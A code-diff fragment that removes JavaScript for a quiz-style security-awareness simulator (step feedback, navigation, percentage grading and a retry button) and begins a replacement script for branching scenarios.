-  const feedback = document.getElementById('simFeedback');
-  feedback.classList.add('show');
-  feedback.innerHTML = `
-    <div class="feedback-title ${choice.correct ? 'correct' : 'incorrect'}">
-      ${choice.correct ? '✓ Correct' : '✗ Incorrect'}
-    </div>
-    <div class="feedback-text">${choice.feedback}</div>
-    <div class="feedback-explanation">
-      <div class="explanation-title">// Explanation</div>
-      <div class="explanation-text">${step.explanation}</div>
-    </div>
-  `;
-
-  document.getElementById('simNextBtn').style.display = 'inline-block';
-}
-
-function simNext() {
-  if (simState.stepIndex < simState.scenario.steps.length - 1) {
-    simState.stepIndex++;
-    renderSimStep();
-  } else {
-    showSimResults();
-  }
-}
-
-function simBack() {
-  document.getElementById('simulationContainer').style.display = 'none';
-  document.getElementById('simulationContainer').classList.remove('active');
-  document.getElementById('simIntroSection').style.display = 'block';
-}
-
-function showSimResults() {
-  const pct = Math.round((simState.score / simState.total) * 100);
-  const container = document.getElementById('simulationContainer');
-  const grade = pct >= 80 ? { label: 'EXCELLENT', color: '#00ff9f' } : pct >= 60 ? { label: 'GOOD', color: '#ffaa00' } : { label: 'NEEDS REVIEW', color: '#ff3366' };
-
-  container.innerHTML = `
-    <div class="simulation-header" style="text-align:center;padding:3rem 2rem">
-      <div style="font-size:3rem;margin-bottom:1rem">${pct >= 80 ? '🏆' : pct >= 60 ? '⚡' : '📚'}</div>
-      <div class="sim-title" style="font-size:2rem;color:${grade.color}">${grade.label}</div>
-      <div style="font-family:var(--mono);font-size:3rem;font-weight:700;color:${grade.color};margin:1rem 0">${pct}%</div>
-      <div class="sim-context">${simState.score} / ${simState.total} correct — ${simState.scenario.title}</div>
-    </div>
-    <div class="action-buttons" style="margin-top:2rem">
-      <button class="btn btn-secondary" onclick="simBack()">← All Simulations</button>
-      <button class="btn btn-primary" onclick="launchSim('${simState.scenario === SIM_DATA[Object.keys(SIM_DATA).find(k => SIM_DATA[k] === simState.scenario)] ? Object.keys(SIM_DATA).find(k => SIM_DATA[k] === simState.scenario) : 'phishing'}')">↺ Retry</button>
-    </div>
-  `;
-}
-
-// Init sim cards when DOM is ready
-document.addEventListener('DOMContentLoaded', initSimCards);
-// Also init immediately in case DOM is already loaded
-if (document.readyState !== 'loading') initSimCards();
-
-
-// ════════════════════════════════════════════════
-// BRANCHING SCENARIOS JS
-// ════════════════════════════════════════════════
+<script>
 
     let currentScenario = null;
     let currentNodeId = null;
